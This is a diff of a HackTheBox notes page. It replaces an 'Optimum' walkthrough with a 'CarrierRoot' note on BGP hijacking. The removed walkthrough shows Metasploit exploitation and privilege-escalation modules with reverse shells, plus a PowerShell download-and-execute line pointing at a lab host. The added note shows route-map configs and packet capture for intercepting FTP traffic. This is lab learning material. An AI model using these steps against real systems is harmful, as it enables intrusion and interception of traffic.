@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2019-03-19T14:29:08 EDT">
-<title>Optimum :: DocDock Documentation</title>
+<title>CarrierRoot :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -25,7 +25,7 @@
 
     
   </head>
-  <body data-url="/hackthebox/boxes/optimum/">
+  <body data-url="/hackthebox/boxes/carrier-root/">
     
       <header>
   <div class="logo">
@@ -156,7 +156,7 @@
         </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
+<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item active">
     <div>
         <a href="/hackthebox/boxes/carrier-root/">
             CarrierRoot
@@ -191,7 +191,7 @@
         <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item active">
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
     <div>
         <a href="/hackthebox/boxes/optimum/">
             Optimum
@@ -458,7 +458,7 @@
   -- 
    Blue</option>
       <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
-      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
+      <option value="/hackthebox/boxes/carrier-root/"  selected>-- CarrierRoot</option>
     <option value="/hackthebox/boxes/crimestoppers/" >
   -- 
    CrimeStopper</option>
@@ -469,7 +469,7 @@
     <option value="/hackthebox/boxes/mischief/" >
   -- 
    Mischief</option>
-      <option value="/hackthebox/boxes/optimum/"  selected>-- Optimum</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
     <option value="/hackthebox/boxes/poison/" >
   -- 
    Poison</option>
@@ -525,280 +525,157 @@
       </div>
     
 
-    <h1>Optimum</h1>
+    <h1>CarrierRoot</h1>
     
     
     
-    <p>NMAP</p>
+    <p>This guide will only cover setting up BGP high jacking and to better summarize how to set up a MITM using BGP. There is one method that I believe everyone used which is where you host an FTP server and just redirect the track to your server. Not quite as cool as mitm.</p>
 
-<pre><code>nmap -sV -sC 10.10.10.8  
- 
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00:19 EST                                     
-Nmap scan report for 10.10.10.8                                                                     
-Host is up (0.042s latency).                                                                       
-Not shown: 999 filtered ports                                                                       
-PORT   STATE SERVICE VERSION                                                                       
-80/tcp open  http    HttpFileServer httpd 2.3                                                       
-|_http-server-header: HFS 2.3                                                                       
-|_http-title: HFS /
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+<p><a href="https://www.youtube.com/watch?v=2ZxRA8BgmnA">https://www.youtube.com/watch?v=2ZxRA8BgmnA</a></p>
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds
+<p><a href="https://0xdf.gitlab.io/2019/03/16/htb-carrier.html#bgp-hijack">https://0xdf.gitlab.io/2019/03/16/htb-carrier.html#bgp-hijack</a></p>
+
+<p>There&rsquo;s a script running in the background that will reset all the changes made. I had to deal with this the whole time I did the lab. I never once tried to disable it. Next time I have a cron job running the background that&rsquo;s hindering me in someway ill use this.</p>
+
+<pre><code>reading 		crontab -l | grep -v &quot;^#&quot;
+disable 		chmod -x /opt/restore.sh
+</code></pre>
+
+<p>I used telnet to connect the router and perform my administrator. It was kind of a pain you had to do some extra steps like fixing the 45007 45005 errors. Adding a password to quagga configuration files. Typing in the credentials was a pain.  0xdf used vtysh free range routing software suite for managing background protocols.</p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier-root/vtysh.PNG" alt="vtysh" /></p>
+
+<p>overview</p>
+
+<p>show running-config -</p>
+
+<p>permit - basically the order in which route-maps are checked in order, once all of the controls of been checked it will break out if none are met.</p>
+
+<p>prefix-list   - I missed this part in my attempts ip prefix-list a set of conditions to check routes against either deny or allow. my understanding of this is that well be targeting 10.120.15.0 network since the network is using /24 /25. If you have two router advertising two different subnets which everyone has the closest match will have priority. an example would be 10.120.0.0/16, the host2 10.120.15.0./24 would be preferred</p>
+
+<p>current configuration</p>
+
+<pre><code>show running-config
+Building configuration...
+
+Current configuration:
+!
+!
+interface eth0
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth1
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface eth2
+ ipv6 nd suppress-ra
+ no link-detect
+!
+interface lo
+ no link-detect
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ network 10.120.15.0/25
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+ip prefix-list chicken seq 5 permit 10.120.15.0/25
+!
+route-map to-as200 permit 5
+ match ip address prefix-list chicken
+ set community no-export
+!
+route-map to-as300 deny 5
+ match ip address prefix-list chicken
+!
+route-map to-as200 permit 10
+!
+route-map to-as300 permit 10
+!
+ip forwarding
+!
+line vty
+!
+end
+</code></pre>
+
+<p>route-map to-as200 effects that autonomous system</p>
+
+<pre><code>configure terminal
+####
+routes to 10.120.15.0. because it is more specific than /21 as300 advertising this route will have priority. 
+####
+ip prefix-list chicken permit 10.120.15.0/25
+
+####
+route 10.120.15.0 subnet to as100,set community no-export tells as200 not to advertise it's route to as300. this is pretty important.
+####
+route-map to-as200 permit 5
+set community no-export
+match ip address prefix-list chicken
+
+####
+I think this is disconnects as300 to as200
+####
+route-map to-as300 deny 5
+match ip address prefix-list chicken
+
+ou need to do this to advertise the route.
+router bgp 100
+network 10.120.15.0 mask 255.255.255.128
+</code></pre>
+
+<pre><code>configure terminal
+
+ip prefix-list chicken permit 10.120.15.0/25
+
+route-map to-as200 permit 5
+match ip address prefix-list chicken
+set community no-export
+
+route-map to-as300 deny 5
+match ip address prefix-list chicken
 
 </code></pre>
 
-<p>hfs is vulnerable to a cmd injection vuln. That will allow us to Invoke a nishang shell</p>
+<p>tcpdump</p>
 
-<p><img src="https://chickenpwny.github.io/images/optimium/hfs.PNG" alt="hfs" /></p>
-
-<p><img src="https://chickenpwny.github.io/images/optimium/powershell-Invoker.PNG" alt="powershell-Invoker" /></p>
-
-<p>SEARCHSPLOIT</p>
-
-<pre><code>searchsploit hfs
---------------------------------------------------------------------------------------------------------------------- ----------------------------------------
- Exploit Title                                                                                                       |  Path
-                                                                                                                     | (/usr/share/exploitdb/)
---------------------------------------------------------------------------------------------------------------------- ----------------------------------------
-Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                                                    | exploits/osx/dos/29454.txt
-Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)                                                              | exploits/osx/dos/12375.c
-Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                                                          | exploits/osx/local/35488.c
-Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation                                                   | exploits/osx/local/8266.txt
-FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                                                           | exploits/windows/remote/37985.py
-Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                                                          | exploits/linux/dos/28895.txt
-Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                               | exploits/windows/remote/34926.rb
-Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                    | exploits/windows/remote/31056.py
-Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                       | exploits/multiple/remote/30850.txt
-Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                  | exploits/windows/remote/34668.txt
-Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                  | exploits/windows/remote/39161.py
-Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                             | exploits/windows/webapps/34852.txt
---------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+<pre><code>tcpdump -i eth2 -nnXSs 0 'port 21' -w out.pcap 
 </code></pre>
 
-<p>So First i got a nishang shell then i moved over to a nc.exe shell using this really cool trick 0xdf used in his devel writeup. <a href="https://0xdf.gitlab.io/2019/03/05/htb-devel.html#shell-as-web">https://0xdf.gitlab.io/2019/03/05/htb-devel.html#shell-as-web</a>   . after that im going to run Watson and find an exploit.</p>
+<p><img src="../../../../../../Users/charl/OneDrive/Pictures/hackthebox/carrier-root/bgp.PNG" alt="bgp" /></p>
 
-<pre><code>systeminfo
+<p>Passwords BGPtelc0routing</p>
+
+<p>ippsec</p>
+
+<p>ippsec used <a href="https://www.draw.io">https://www.draw.io</a> to make to make the network diagram.</p>
+
+<p>tools to do research on ASN&rsquo;s. these tools are great to use during a pentest to find ip&rsquo;s owned by a the target.</p>
+
+<p>ultratools.com for asn lookup. ipinfo.io</p>
+
+<p>using base64 to move files without damaging the integrity of the data is a trick worth remembering.</p>
+
+<pre><code>base64 -w 0 chicken.pcap
+base64 -d chicken.b64.pcap &gt; chickenpwny.pcap
 </code></pre>
-
-<p>its running on x64-baseed pc using</p>
-
-<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP&quot;
-</code></pre>
-
-<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF 
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4 
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0 
-</code></pre>
-
-<pre><code>cd C:\Users&gt;c:\Windows\Microsoft.NET\Framework
-dir /A:D
-</code></pre>
-
-<p><img src="https://chickenpwny.github.io/images/optimium/framework-net.PNG" alt="framework-net" /></p>
-
-<p>i will compile it in 4.0 .net. 0xdf has a great guide for compiling watson &amp; ippsec has a video on it.</p>
-
-<p><a href="https://0xdf.gitlab.io/2019/03/05/htb-devel.html#Watson">https://0xdf.gitlab.io/2019/03/05/htb-devel.html#Watson</a></p>
-
-<pre><code>\\10.10.14.49\share\Watson-net4-64base.exe
-  __    __      _
- / / /\ \ \__ _| |_ ___  ___  _ __
- \ \/  \/ / _` | __/ __|/ _ \| '_ \
-  \  /\  / (_| | |_\__ \ (_) | | | |
-   \/  \/ \__,_|\__|___/\___/|_| |_|
-
-                           v0.1
-
-                  Sherlock sucks...
-                   @_RastaMouse
-
- [*] OS Build number: 9600
- [*] CPU Address Width: 64
- [*] Process IntPtr Size: 8
- [*] Using Windows path: C:\WINDOWS\System32
-
-  [*] Appears vulnerable to MS15-051
-   [&gt;] Description: An EoP exists due to improper object handling in the win32k.sys kernel mode driver.
-   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
-   [&gt;] Notes: None.
-
-  [*] Appears vulnerable to MS15-076
-   [&gt;] Description: Local DCOM DCE/RPC connections can be reflected back to a listening TCP socket allowing access to an NTLM authentication challenge for LocalSystem, which can be replayed to the local DCOM activation service to elevate privileges.
-   [&gt;] Exploit: https://www.exploit-db.com/exploits/37768/
-   [&gt;] Notes: None.
-
-  [*] Appears vulnerable to MS15-078
-   [&gt;] Description: An EoP exists due to a pool based buffer overflow in the atmfd.dll driver when parsing a malformed font.
-   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_078_atmfd_bof.rb
-   [&gt;] Notes: None.
-  [*] Appears vulnerable to MS16-032
-   [&gt;] Description: An EoP exists due to a lack of sanitization of standard handles in Windows' Secondary Logon Service.
-   [&gt;] Exploit: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
-   [&gt;] Notes: None.
-
-  [*] Appears vulnerable to MS16-034
-   [&gt;] Description: An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory.
-   [&gt;] Exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034
-   [&gt;] Notes: None.
-
- [*] Finished. Found 5 vulns :)
-ERROR&gt; C:\WINDOWS\System32\drivers\mrxdav.sys
-ERROR&gt; C:\WINDOWS\System32\win32kfull.sys
-ERROR&gt; C:\WINDOWS\System32\pcadm.dll
-ERROR&gt; C:\WINDOWS\System32\coremessaging.dll
-
-
-
-</code></pre>
-
-<p>I could never get this to work i tried a bunch of different ways. ippsec said that the other ms16032 exploit out there requires additional modification to work. but the empire framework offers an easier solution. \10.10.14.49\share\Invoke-MS16032.ps1</p>
-
-<p>add this at the end of ms16032</p>
-
-<pre><code>Invoke-MS16032 -Command &quot;iex(New-Object Net.Webclient).downloadstring('http://10.10.14.49/sploit.ps1')&quot;
-</code></pre>
-
-<p>then invoke it, after you load the payload you can call the funtions with Invoke-MS16032</p>
-
-<p>METASPLOIT</p>
-
-<p>i couldn&rsquo;t get it to work so on to metasploit.</p>
-
-<pre><code>search rejetto
-use windows/http/rejetto_hfs_exec
-</code></pre>
-
-<p>Make sure burp is running.</p>
-
-<pre><code>options 
-Module options (exploit/windows/http/rejetto_hfs_exec):
-
-   Name       Current Setting      Required  Description
-   ----       ---------------      --------  -----------
-   HTTPDELAY  10                   no        Seconds to wait before terminating web server
-   Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOSTS     10.10.10.8           yes       The target address range or CIDR identifier
-   RPORT      80                   yes       The target port (TCP)
-   SRVHOST    10.10.14.49          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
-   SRVPORT    8088                 yes       The local port to listen on.
-   SSL        false                no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI  /                    yes       The path of the web application
-   URIPATH                         no        The URI to use for this exploit (default is random)
-   VHOST                           no        HTTP server virtual host
-
-
-Payload options (windows/x64/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.10.14.49      yes       The listen address (an interface may be specified)
-   LPORT     4446             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Automatic
-
-</code></pre>
-
-<p>NEXT</p>
-
-<p>First you need to load the regular meterpreter x86 to find the vuln then move to x64 to run the exploit. set lport to something else. set target 1 will run in x64 mode.</p>
-
-<pre><code>set payload windows/x64/meterpreter/reverse_tcp
-set LPORT 9017
-</code></pre>
-
-<p>RUN</p>
-
-<p>exit the session with crtl + z save session remember the session number.</p>
-
-<pre><code>search ms16_032
-windows/local/ms16_032_secondary_logon_handle_privesc
-</code></pre>
-
-<p>options</p>
-
-<p>target 1 to change to x64, session number, set the lport to something different than the meterpreter shell.</p>
-
-<pre><code>set target 1
-set lport 9019
-set session 2
-run
-</code></pre>
-
-<pre><code>Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SESSION  3                yes       The session to run this module on.
-
-
-Payload options (windows/x64/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
-   LHOST     10.10.14.49      yes       The listen address (an interface may be specified)
-   LPORT     4446             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   1   Windows x64
-</code></pre>
-
-<p>Then it hangs.</p>
-
-<p>ALPX task scheduler local privilege elevation</p>
-
-<p>writes arbitrary dacls to ,job files located in c:windows\task. This is pretty bad lol it doesn&rsquo;t check for an impersonation attack. since we can create files in c:\windows\task folder a hardlink can be created to a file the user has read access to. after creating a hardlink, the vulnerability can triggered to set the dacls ton the linked file. teste dup windows10</p>
-
-<pre><code>msf5 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/alpc_taskscheduler
-msf5 exploit(windows/local/alpc_taskscheduler) &gt; options
-
-Module options (exploit/windows/local/alpc_taskscheduler):
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   PROCESS                   no        Name of process to spawn and inject dll into.
-   SESSION                   yes       The session to run this module on.
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Windows 10 x64
-</code></pre>
-
-<p>need to set the lhost, lport,  &amp; session.</p>
-
-<pre><code>set session 2
-set payload windows/x64/meterpreter/reverse_tcp
-set lhost ippaddr
-set lport 443
-run
-</code></pre>
-
-<p><img src="https://chickenpwny.github.io/images/optimum/root.PNG" alt="root" /></p>
-
-<p><img src="https://chickenpwny.github.io/images/optimum/502.jpg" alt="502" /></p>
 
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/hackthebox/boxes/mischief/" title="Mischief"> <i class="fa fa-chevron-left"></i><label>Mischief</label></a>
-    <a class="nav nav-next" href="/hackthebox/boxes/poison/" title="Poison" style="margin-right: 0px;"><label>Poison</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/hackthebox/boxes/carrier/" title="Carrier"> <i class="fa fa-chevron-left"></i><label>Carrier</label></a>
+    <a class="nav nav-next" href="/hackthebox/boxes/crimestoppers/" title="CrimeStopper" style="margin-right: 0px;"><label>CrimeStopper</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -815,7 +692,7 @@ run
 
     
     <div class="github-link">
-      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/optimum.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/carrier-root.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
